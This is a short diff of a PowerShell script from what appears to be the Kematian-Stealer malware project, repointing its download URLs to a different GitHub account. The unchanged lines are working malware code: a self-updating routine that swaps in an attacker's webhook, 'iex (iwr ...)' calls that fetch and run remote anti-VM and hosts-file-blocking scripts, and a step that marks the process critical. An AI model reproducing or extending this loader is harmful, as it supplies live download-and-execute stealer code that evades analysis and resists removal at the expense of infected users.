@@ -42,7 +42,7 @@ function AUTOUPDATE {
     if ($autoupdate) { 
         $updateandrun = Invoke-WebRequest -Uri "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1" 
         $updateandrun -replace "YOUR_WEBHOOK_HERE", $webhook | Out-File -FilePath $pscommandpath -Encoding ASCII
-        $url = "https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
+        $url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
         $outputPath = "$env:tmp\Kematian.pfx"
 		if (Test-Path $outputPath) {Remove-Item $outputPath -Force}
         Invoke-WebRequest -Uri $url -OutFile $outputPath 
@@ -93,13 +93,13 @@ function CHECK_AND_PATCH {
 
 function VMPROTECT {
 if ($criticalprocess) {
-	$link = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+	$link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
 	iex (iwr -uri $link -useb)
     [ProcessUtility]::MakeProcessCritical()
 	Invoke-TASKS
 	}
  else {
-	 $link = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+	 $link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
 	 iex (iwr -uri $link -useb)
      Invoke-TASKS
    }
@@ -1135,7 +1135,7 @@ function Invoke-TASKS {
     Write-Host "[!] Task Created" -ForegroundColor Green
 	}
     if ($blockhostsfile) {
-	$link = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1")
+	$link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1")
 	iex (iwr -uri $link -useb)
     
     }
